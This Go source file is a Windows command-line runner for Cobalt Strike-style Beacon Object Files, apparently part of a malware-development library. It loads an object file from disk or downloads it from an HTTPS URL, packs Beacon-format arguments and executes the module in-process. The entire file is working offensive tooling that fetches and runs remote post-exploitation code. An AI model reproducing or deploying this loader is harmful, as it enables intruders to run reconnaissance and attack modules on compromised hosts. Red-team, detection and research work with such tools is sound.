//go:build windows

// bof-runner — execute a Beacon Object File and print its output.
//
// Usage:
//
//	bof-runner -file path/to/file.o [-arg-int N] [-arg-string S] [-arg-short N] [-arg-bytes hex]
//	bof-runner -url https://... [...]
//
// Args are packed in CS-compatible BeaconDataPack format and consumed
// by the BOF via BeaconDataParse / DataInt / DataShort / DataExtract.
//
// Designed to run real-world BOFs from the public ecosystem
// (TrustedSec situational-awareness, Outflank, FortyNorth TerraTwist,
// the Cobalt-Strike-community-kit, …). Constraints documented in
// docs/techniques/runtime/bof-loader.md "Beacon-API limitations".
package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"

	"github.com/oioio-space/maldev/runtime/bof"
)

func main() {
	var (
		filePath  = flag.String("file", "", "local path to a .o BOF (mutually exclusive with -url)")
		url       = flag.String("url", "", "HTTPS URL to fetch the BOF from (mutually exclusive with -file)")
		entry     = flag.String("entry", "go", "entry-point symbol name (default: go)")
		spawnTo   = flag.String("spawn-to", "", "value returned by BeaconGetSpawnTo (empty = none)")
		argInts   intsFlag
		argShorts intsFlag
		argStrs   stringsFlag
		argBytes  stringsFlag
	)
	flag.Var(&argInts, "arg-int", "append a 4-byte int to the args buffer (repeatable)")
	flag.Var(&argShorts, "arg-short", "append a 2-byte short to the args buffer (repeatable)")
	flag.Var(&argStrs, "arg-string", "append a length-prefixed string (repeatable)")
	flag.Var(&argBytes, "arg-bytes", "append length-prefixed raw bytes from a hex string (repeatable)")
	flag.Parse()

	if (*filePath == "") == (*url == "") {
		fatal("exactly one of -file or -url is required")
	}

	data := loadBOF(*filePath, *url)

	args := bof.NewArgs()
	for _, v := range argInts {
		args.AddInt(int32(v))
	}
	for _, v := range argShorts {
		args.AddShort(int16(v))
	}
	for _, s := range argStrs {
		args.AddString(s)
	}
	for _, h := range argBytes {
		raw, err := hex.DecodeString(strings.TrimPrefix(h, "0x"))
		if err != nil {
			fatal("invalid -arg-bytes %q: %v", h, err)
		}
		args.AddBytes(raw)
	}

	b, err := bof.Load(data)
	if err != nil {
		fatal("Load: %v", err)
	}
	b.Entry = *entry
	if *spawnTo != "" {
		b.SetSpawnTo(*spawnTo)
	}

	out, err := b.Execute(args.Pack())
	if err != nil {
		fatal("Execute: %v", err)
	}

	if len(out) > 0 {
		fmt.Print(string(out))
		if !strings.HasSuffix(string(out), "\n") {
			fmt.Println()
		}
	}
	if errs := b.Errors(); len(errs) > 0 {
		fmt.Fprint(os.Stderr, "[errors]\n", string(errs))
	}
}

func loadBOF(path, url string) []byte {
	if path != "" {
		data, err := os.ReadFile(path)
		if err != nil {
			fatal("read %s: %v", path, err)
		}
		return data
	}
	if !strings.HasPrefix(url, "https://") {
		fatal("only https:// URLs are accepted")
	}
	resp, err := http.Get(url) //nolint:gosec // operator-supplied URL is the entire point
	if err != nil {
		fatal("fetch %s: %v", url, err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		fatal("fetch %s: HTTP %d", url, resp.StatusCode)
	}
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		fatal("read body: %v", err)
	}
	return data
}

type intsFlag []int

func (f *intsFlag) String() string { return "" }
func (f *intsFlag) Set(v string) error {
	var n int
	if _, err := fmt.Sscanf(v, "%d", &n); err != nil {
		return err
	}
	*f = append(*f, n)
	return nil
}

type stringsFlag []string

func (f *stringsFlag) String() string { return "" }
func (f *stringsFlag) Set(v string) error {
	*f = append(*f, v)
	return nil
}

func fatal(format string, args ...interface{}) {
	fmt.Fprintf(os.Stderr, format+"\n", args...)
	os.Exit(1)
}
